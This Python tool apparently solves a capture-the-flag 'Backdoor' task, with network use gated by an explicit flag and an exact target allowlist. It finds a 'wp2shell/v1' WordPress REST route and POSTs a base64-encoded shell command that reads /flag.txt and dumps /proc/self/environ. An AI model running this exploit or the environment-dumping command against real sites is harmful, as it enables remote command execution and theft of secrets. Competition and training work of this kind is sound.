#!/usr/bin/env python3
"""Explicit, allowlisted active clients for ICO qualification service tasks.

Nothing in the normal ``ico-scan`` or ``ico-solve`` path imports this module or
opens a socket. The Backdoor client is started only by this dedicated command
with ``--allow-network`` and a matching ``--authorized-target``.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Mapping, Sequence
from urllib.parse import urlsplit

from ico_active import AuthorizedClient, TargetPolicy
from ico_quals_solvers import QualsTaskResult, _flag_values, _step, _write_artifact


_ROUTE_PREFIX = "/wp2shell/v1/"
_ROUTE_RE = re.compile(r"^/wp2shell/v1/[A-Za-z0-9._~-]+/?$")
_MAX_RESPONSE_BYTES = 2 * 1024 * 1024
_MAX_TIMEOUT_SECONDS = 30.0
_FLAG_COMMAND = r"cat /flag.txt; tr '\0' '\n' < /proc/self/environ"


@dataclass(frozen=True)
class _Target:
    scheme: str
    host: str
    port: int
    netloc: str
    path_prefix: str

    @property
    def identity(self) -> tuple[str, str, int, str]:
        return self.scheme, self.host, self.port, self.path_prefix

    @property
    def base_url(self) -> str:
        return f"{self.scheme}://{self.netloc}{self.path_prefix}"


def _parse_target(raw: str) -> _Target:
    try:
        parsed = urlsplit(str(raw).strip())
        if parsed.scheme.lower() not in {"http", "https"} or not parsed.hostname:
            raise ValueError("target must be an absolute http(s) URL")
        if parsed.username is not None or parsed.password is not None:
            raise ValueError("target URL must not contain credentials")
        if parsed.query or parsed.fragment:
            raise ValueError("target URL must not contain a query or fragment")
        host = parsed.hostname.rstrip(".").lower()
        port = parsed.port or (443 if parsed.scheme.lower() == "https" else 80)
    except ValueError as exc:
        raise ValueError(f"invalid target URL: {exc}") from exc
    prefix = parsed.path.rstrip("/")
    if "\\" in prefix or any(part in {".", ".."} for part in prefix.split("/")):
        raise ValueError("target path prefix is not safe")
    netloc = parsed.netloc
    return _Target(parsed.scheme.lower(), host, port, netloc, prefix)


def _route_methods(route_info: object) -> set[str]:
    methods: set[str] = set()
    if not isinstance(route_info, Mapping):
        return methods
    raw = route_info.get("methods", [])
    if isinstance(raw, str):
        methods.add(raw.upper())
    elif isinstance(raw, list):
        methods.update(str(value).upper() for value in raw)
    endpoints = route_info.get("endpoints", [])
    if isinstance(endpoints, list):
        for endpoint in endpoints:
            if not isinstance(endpoint, Mapping):
                continue
            endpoint_methods = endpoint.get("methods", [])
            if isinstance(endpoint_methods, str):
                methods.add(endpoint_methods.upper())
            elif isinstance(endpoint_methods, list):
                methods.update(str(value).upper() for value in endpoint_methods)
    return methods


def _discover_backdoor_routes(document: object) -> list[str]:
    if not isinstance(document, Mapping):
        return []
    routes = document.get("routes")
    if not isinstance(routes, Mapping):
        return []
    found: list[str] = []
    for raw_path, route_info in routes.items():
        path = str(raw_path)
        if not path.startswith(_ROUTE_PREFIX) or not _ROUTE_RE.fullmatch(path):
            continue
        if any(part in {".", ".."} for part in path.split("/")):
            continue
        if _route_methods(route_info) & {"POST"}:
            found.append(path)
    return sorted(set(found))


def _url(target: _Target, path: str) -> str:
    return f"{target.scheme}://{target.netloc}{target.path_prefix}{path}"


def _response_line(method: str, url: str, response: Any, request_json: Mapping[str, object] | None = None) -> str:
    safe_headers = {
        key: value
        for key, value in response.headers.items()
        if key in {"content-type", "content-length", "location"}
    }
    item: dict[str, object] = {
        "method": method,
        "url": url,
        "status": response.status,
        "headers": safe_headers,
        "response_body_base64": base64.b64encode(response.body).decode("ascii"),
        "error": response.error,
    }
    if request_json is not None:
        item["request_json"] = dict(request_json)
    return json.dumps(item, ensure_ascii=False, sort_keys=True)


def solve_backdoor_instance(
    target_url: str,
    *,
    authorized_targets: Sequence[str],
    allow_network: bool,
    output_dir: Path,
    timeout_seconds: float = 10.0,
) -> QualsTaskResult:
    """Discover the task's WordPress REST route and retrieve returned flags.

    The function never guesses a route: it requires exactly one POST route in
    the ``wp2shell/v1`` namespace from the target's public REST index. It sends
    one GET and one POST containing the task-specific, base64-encoded command.
    """

    if not allow_network:
        raise PermissionError("active solving requires explicit --allow-network")
    if timeout_seconds <= 0 or timeout_seconds > _MAX_TIMEOUT_SECONDS:
        raise ValueError(f"timeout must be between 0 and {_MAX_TIMEOUT_SECONDS} seconds")
    if not authorized_targets:
        raise PermissionError("active solving requires an authorized target allowlist")

    target = _parse_target(target_url)
    allowed = [_parse_target(item) for item in authorized_targets]
    if not any(item.identity == target.identity for item in allowed):
        raise PermissionError("target URL does not exactly match an authorized target")

    policy = TargetPolicy(
        allowed_hosts=(target.host,),
        max_requests=2,
        timeout_seconds=timeout_seconds,
        max_response_bytes=_MAX_RESPONSE_BYTES,
    )
    client = AuthorizedClient(policy)
    result = QualsTaskResult(
        task_id="backdoor",
        task_dir=Path(output_dir).expanduser().resolve(),
        solver="backdoor-wp-rest-rce",
        status="candidate-review",
    )
    transcript: list[str] = []

    rest_index_url = _url(target, "/wp-json/")
    index_response = client.request("GET", rest_index_url, headers={"Accept": "application/json"})
    transcript.append(_response_line("GET", rest_index_url, index_response))
    _step(
        result,
        "read-wordpress-rest-index",
        "ok" if index_response.status == 200 and not index_response.error else "needs-review",
        status_code=index_response.status,
        error=index_response.error,
        request_count=client.request_count,
    )
    if index_response.error or index_response.status != 200:
        result.status = "requires-authorized-session"
        result.error = index_response.error or f"REST index returned HTTP {index_response.status}"
        _step(result, "route-discovery", "unavailable", reason=result.error)
        _write_artifact(result, Path(output_dir), "backdoor-active-transcript.jsonl", "\n".join(transcript) + "\n")
        return result

    try:
        index_document = json.loads(index_response.body.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        result.error = f"REST index is not valid JSON: {exc}"
        result.status = "candidate-review"
        _step(result, "route-discovery", "malformed-input", error=result.error)
        _write_artifact(result, Path(output_dir), "backdoor-active-transcript.jsonl", "\n".join(transcript) + "\n")
        return result

    routes = _discover_backdoor_routes(index_document)
    _step(result, "route-discovery", "ok" if len(routes) == 1 else "needs-review", route_count=len(routes), routes=routes)
    if len(routes) != 1:
        result.status = "candidate-review"
        result.error = "expected exactly one POST route in the wp2shell/v1 namespace"
        _write_artifact(result, Path(output_dir), "backdoor-active-transcript.jsonl", "\n".join(transcript) + "\n")
        return result

    route_path = routes[0]
    post_url = _url(target, "/wp-json" + route_path)
    encoded_command = base64.b64encode(_FLAG_COMMAND.encode("utf-8")).decode("ascii")
    request_json = {"c": encoded_command}
    command_response = client.request(
        "POST",
        post_url,
        headers={"Accept": "application/json"},
        body=request_json,
    )
    transcript.append(_response_line("POST", post_url, command_response, request_json))
    _step(
        result,
        "read-task-flags",
        "ok" if command_response.status is not None and 200 <= command_response.status < 300 and not command_response.error else "needs-review",
        status_code=command_response.status,
        error=command_response.error,
        route=route_path,
        request_count=client.request_count,
        response_bytes=len(command_response.body),
        possibly_truncated=len(command_response.body) >= _MAX_RESPONSE_BYTES,
    )
    transcript_path = _write_artifact(
        result,
        Path(output_dir),
        "backdoor-active-transcript.jsonl",
        "\n".join(transcript) + "\n",
    )
    values = _flag_values(command_response.body)
    result.candidates.extend(
        {
            "value": value,
            "state": "transcript-derived",
            "evidence": str(transcript_path),
            "source": "authorized-challenge-service-response",
            "method": "wordpress-rest-command-output",
        }
        for value in values
    )
    if values:
        result.status = "candidate"
    elif command_response.error or command_response.status is None or not 200 <= command_response.status < 300:
        result.status = "requires-authorized-session"
        result.error = command_response.error or f"command route returned HTTP {command_response.status}"
    else:
        result.status = "candidate-review"
        result.error = "task service response contained no flag-shaped value"
    return result


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ico-quals-active",
        description="Solve the ICO Backdoor task on one explicitly authorized challenge instance.",
    )
    parser.add_argument("--target", required=True, help="base URL of the assigned Backdoor challenge instance")
    parser.add_argument(
        "--authorized-target",
        action="append",
        required=True,
        help="exact authorized target URL; repeat only for explicitly scoped targets",
    )
    parser.add_argument("--allow-network", action="store_true", required=True, help="explicitly enable the two task requests")
    parser.add_argument("--out", type=Path, required=True, help="directory for JSON report and saved HTTP evidence")
    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout, at most 30 seconds")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = _build_parser().parse_args(argv)
    if args.timeout <= 0 or args.timeout > _MAX_TIMEOUT_SECONDS:
        _build_parser().error(f"--timeout must be between 0 and {_MAX_TIMEOUT_SECONDS}")
    try:
        result = solve_backdoor_instance(
            args.target,
            authorized_targets=tuple(args.authorized_target),
            allow_network=args.allow_network,
            output_dir=args.out,
            timeout_seconds=args.timeout,
        )
    except (OSError, PermissionError, ValueError) as exc:
        print(f"ico-quals-active: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1
    report_path = args.out.expanduser().resolve() / "report.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(result.to_dict(), ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"REPORT: {report_path}")
    print(f"STATUS: {result.status}")
    for candidate in result.candidates:
        print(candidate["value"])
    return 0 if result.candidates else 2


if __name__ == "__main__":
    raise SystemExit(main())
